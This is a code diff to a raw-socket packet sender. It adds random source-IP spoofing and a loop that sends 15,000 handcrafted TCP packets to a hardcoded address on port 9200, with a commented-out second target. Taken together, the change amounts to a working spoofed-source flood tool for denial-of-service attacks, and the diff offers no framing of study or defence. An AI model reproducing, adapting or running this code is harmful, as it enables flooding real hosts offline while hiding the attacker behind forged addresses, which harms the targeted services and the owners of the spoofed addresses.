@@ -4,6 +4,15 @@
 #include <errno.h>
 #include <netinet/tcp.h>
 #include <netinet/ip.h>
+#include <arpa/inet.h>
+#include <iostream>
+#include <time.h>
+#include <stdlib.h>
+#include "../../include/util/TypeTransform.h"
+
+
+
+using namespace GCommon::GUtil;
 
 struct pseudo_header
 {
@@ -43,9 +52,43 @@ unsigned short csum(unsigned short *ptr,int nbytes){
 
 }
 
+//get a random num in 1--254
+int mRandom(double start,double end){
+  /*srand((int)time(0));
+  int num=rand(); 
+  return num%254;
+  */
+  return start+(end-start)*rand()/(RAND_MAX+1.0);
+
+}
+
+
+
 int main(int argc,char **argv){
 
   static int counter=0;
+  srand(unsigned(time(0)));
+
+while(counter<15000){
+//while(1){
+
+   
+  //std::cout<<"get rand="<<mRandom(1,254)<<std::endl;
+
+  int ipa1=mRandom(1,254);
+  int ipa2=mRandom(1,254);
+  int ipa3=mRandom(1,254);
+  int ipa4=mRandom(1,254);
+
+  std::string ipa;
+  //ipa=CTypeTransform::IntToStr(ipa1);
+  ipa=CTypeTransform::IntToStr(ipa1)+"."+CTypeTransform::IntToStr(ipa2)+"."+CTypeTransform::IntToStr(ipa3)+"."+CTypeTransform::IntToStr(ipa4);
+  std::cout<<"ip ="<<ipa<<std::endl;
+
+  /*
+  counter++;
+  continue;
+  */
 
   int s=socket(PF_INET,SOCK_RAW,IPPROTO_TCP);
   
@@ -59,10 +102,16 @@ int main(int argc,char **argv){
   struct sockaddr_in sin;
   struct pseudo_header psh;
 
-  strcpy(source_ip,"182.254.233.114");
+
+  //std::string attackIp;
+  
+
+  //strcpy(source_ip,"182.254.0.114");
+  strcpy(source_ip,ipa.c_str());
  
   sin.sin_family =AF_INET;
   sin.sin_port = htons(9200);
+  //sin.sin_addr.s_addr=inet_addr("183.60.77.84");
   sin.sin_addr.s_addr=inet_addr("182.254.233.115");
 
   memset(datagram,0,4096);
@@ -111,11 +160,10 @@ int main(int argc,char **argv){
   const int *val=&one;
   if(setsockopt(s,IPPROTO_IP,IP_HDRINCL,val,sizeof(one))<0){
     printf("Error setting setsocket,errno=%d\n",errno);
-    exit(0);
+    //exit(0);
+    return 1;
   }
 
-  //while(counter<100000){
-  while(1){
 
     if(sendto(s,datagram,iph->tot_len,0,(struct sockaddr *)&sin,sizeof(sin))<0){
       printf("Error when send\n");
@@ -123,7 +171,8 @@ int main(int argc,char **argv){
       counter++;
       printf("Packet send ,num=%d,\n\n",counter);
     }
-  }
+  
+}
 
   return 0;
 
